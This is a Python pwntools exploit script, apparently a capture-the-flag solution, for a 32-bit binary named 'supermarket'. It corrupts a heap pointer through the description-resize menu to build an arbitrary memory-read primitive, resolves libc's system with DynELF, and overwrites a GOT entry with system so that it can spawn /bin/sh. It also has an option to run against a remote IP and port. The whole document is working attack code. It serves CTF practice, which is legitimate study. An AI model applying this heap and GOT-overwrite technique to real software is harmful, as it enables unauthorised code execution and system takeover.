#!/usr/bin/env python
# https://www.cnblogs.com/hawkJW/articles/pwn_supermarket.html
from pwn import *

#context.log_level = 'debug'
context.terminal = ['tmux', 'split', '-h']

local = 1
if local:
    p = process('./supermarket')
else:
    p = remote('182.116.62.85', 27518)


def add(name, price, descrip_size, description):
    p.recvuntil('your choice>> ')
    p.send('1\n')

    p.recvuntil('name:')
    p.send(name + '\n')

    p.recvuntil('price:')
    p.send(str(price) + '\n')

    p.recvuntil('descrip_size:')
    p.send(str(descrip_size) + '\n')

    p.recvuntil('description:')
    p.send(str(description) + '\n')
    

def dele(name):
    p.recvuntil('your choice>> ')
    p.send('2\n')

    p.recvuntil('name:')
    p.send(name + '\n')

def lis():
    p.recvuntil('your choice>> ')
    p.send('3\n')
    p.recvuntil('all  commodities info list below:\n')
    return p.recvuntil('\n---------menu---------')[:-len('\n---------menu---------')]

def changePrice(name, price):
    p.recvuntil('your choice>> ')
    p.send('4\n')

    p.recvuntil('name:')
    p.send(name + '\n')

    p.recvuntil('input the value you want to cut or rise in:')
    p.send(str(price) + '\n')

def changeDes(name, descrip_size, description):
    p.recvuntil('your choice>> ')
    p.send('5\n')
    
    p.recvuntil('name:')
    p.send(name + '\n')

    p.recvuntil('descrip_size:')
    p.send(str(descrip_size) + '\n')

    p.recvuntil('description:')
    p.send(description + '\n')

def exit():
    p.recvuntil('your choice>> ')
    p.send('6\n')


add('1', 10, 8, 'a')
add('2', 10, 0x98, 'a')
add('3', 10, 4, 'a')
changeDes('2', 0x100, 'a')
add('4', 10, 4, 'a')

def leak_one(address):
    changeDes('2', 0x98, '4' + '\x00' * 0xf + p32(2) + p32(0x8) + p32(address))
    res = lis().split('des.')[-1]
    if(res == '\n'):
        return '\x00'
    return res[0]

def leak(address):
    content =  leak_one(address) + leak_one(address + 1) + leak_one(address + 2) + leak_one(address + 3)
    log.info('%#x => %#x'%(address, u32(content)))
    return content

d = DynELF(leak, elf = ELF('./supermarket'))
system_addr = d.lookup('system', 'libc') 
log.info('system \'s address = %#x'%(system_addr))
bin_addr = 0x0804B0B8
changeDes('1', 0x8, '/bin/sh\x00')
changeDes('2', 0x98, '4' + '\x00' * 0xf + p32(2) + p32(0x8) + p32(0x0804B018))
changeDes('4', 8, p32(system_addr))
#dele('1')

gdb.attach(p)

p.interactive()

